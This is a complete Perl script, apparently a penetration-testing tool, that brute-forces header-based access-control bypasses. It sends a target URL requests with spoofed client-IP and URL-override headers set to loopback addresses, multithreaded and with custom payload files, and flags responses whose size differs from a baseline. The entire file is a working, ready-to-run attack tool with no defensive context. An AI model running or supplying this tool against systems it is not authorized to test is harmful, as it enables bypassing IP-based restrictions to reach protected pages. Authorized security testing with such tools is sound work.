#!/usr/bin/perl

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request;
use Getopt::Long;
use Term::ANSIColor;
use URI;
use threads;
use Thread::Queue;

# Default headers and payloads
my @headers = qw(Client-IP Connection Contact Forwarded From Host Origin Referer True-Client-IP X-Client-IP X-Custom-IP-Authorization X-Forward-For X-Forwarded-For X-Forwarded-Host X-Forwarded-Server X-Host X-HTTP-Host-Override X-Original-URL X-Originating-IP X-Real-IP X-Remote-Addr X-Remote-IP X-Rewrite-URL X-Wap-Profile);
my @inject  = qw(127.0.0.1 localhost 0.0.0.0 0 127.1 127.0.1 2130706433);

# Command-line options
my ($url, $pfile, $timeout, $verbose, $custom_headers, $threads, $user_agent) = ("", "", 10, 0, "", 1, "Mozilla/5.0 (compatible; CustomHeaderInjector/1.0)");

GetOptions(
    "url=s"         => \$url,
    "pfile=s"       => \$pfile,
    "timeout=i"     => \$timeout,
    "verbose!"      => \$verbose,
    "headers=s"     => \$custom_headers,
    "threads=i"     => \$threads,
    "user-agent=s"  => \$user_agent,
);

# Print usage and exit if URL is missing
if (!$url) {
    print_usage();
    exit 1;
}

# Parse URL
my $uri = URI->new($url);
if (!$uri->scheme || !$uri->host || !$uri->path) {
    die "Invalid URL: $url\n";
}

# Read custom payloads if a file is provided
if ($pfile) {
    @inject = ();
    open my $fh, '<', $pfile or die "Could not open payload file: $!\n";
    while (my $line = <$fh>) {
        chomp $line;
        push @inject, $line;
    }
    close $fh;
}

# Parse custom headers if provided
my %custom_headers_hash;
if ($custom_headers) {
    for my $header (split /,/, $custom_headers) {
        my ($key, $value) = split /:/, $header, 2;
        $custom_headers_hash{$key} = $value;
    }
}

# Initialize user agent
my $ua = LWP::UserAgent->new;
$ua->timeout($timeout);
$ua->agent($user_agent);

# Baseline request
print "Performing baseline request...\n" if $verbose;
my $baseline_resp = perform_request($ua, $url, "", "", \%custom_headers_hash);
my $baseline_size = length($baseline_resp->decoded_content);

# Thread queue for tasks
my $task_queue = Thread::Queue->new;

# Populate the task queue with header-payload combinations
foreach my $header (@headers) {
    foreach my $payload (@inject) {
        $task_queue->enqueue([$header, $payload]);
    }
}

# Add termination signal for threads
$task_queue->enqueue((undef) x $threads);

# Launch threads
my @worker_threads;
for (1 .. $threads) {
    push @worker_threads, threads->create(\&header_inject_worker, $task_queue, $ua, $url, $baseline_size, \%custom_headers_hash, $verbose);
}

# Wait for threads to finish
$_->join for @worker_threads;

sub header_inject_worker {
    my ($queue, $ua, $url, $baseline_size, $custom_headers, $verbose) = @_;

    while (my $task = $queue->dequeue) {
        my ($header, $payload) = @$task;
        my $resp = perform_request($ua, $url, $header, $payload, $custom_headers);

        my $resp_size = length($resp->decoded_content);
        if ($resp_size != $baseline_size) {
            print colored("[+] [$url] [$header: $payload] [Code: " . $resp->code . "] [Size: $resp_size]\n", 'green');
        } else {
            print colored("[-] [$url] [$header: $payload] [Code: " . $resp->code . "] [Size: $resp_size]\n", 'red');
        }
    }
}

sub perform_request {
    my ($ua, $url, $header, $value, $custom_headers) = @_;

    my $req = HTTP::Request->new(GET => $url);
    $req->header($header => $value) if $header && $value;

    # Add custom headers
    for my $key (keys %$custom_headers) {
        $req->header($key => $custom_headers->{$key});
    }

    print "Requesting: [$header: $value]\n" if $verbose;

    my $resp = $ua->request($req);
    if (!$resp->is_success && !$resp->is_redirect) {
        warn "Request failed: " . $resp->status_line . "\n" if $verbose;
    }
    return $resp;
}

sub print_usage {
    print <<"USAGE";
Usage:
  perl header.pl --url https://target.com/resource
  perl header.pl --url https://target.com/resource --pfile payloads.txt --timeout 15 --verbose --threads 4 --headers "X-Custom:Value,X-Test:123"

Options:
  --url <url>         Target URL
  --pfile <file>      Payload File
  --timeout <secs>    HTTP Timeout (default: 10 seconds)
  --verbose           Enable verbose logging
  --threads <num>     Number of concurrent threads (default: 1)
  --headers <list>    Custom headers (comma-separated, e.g., "Key:Value,AnotherKey:Value")
  --user-agent <str>  Custom User-Agent string
USAGE
}
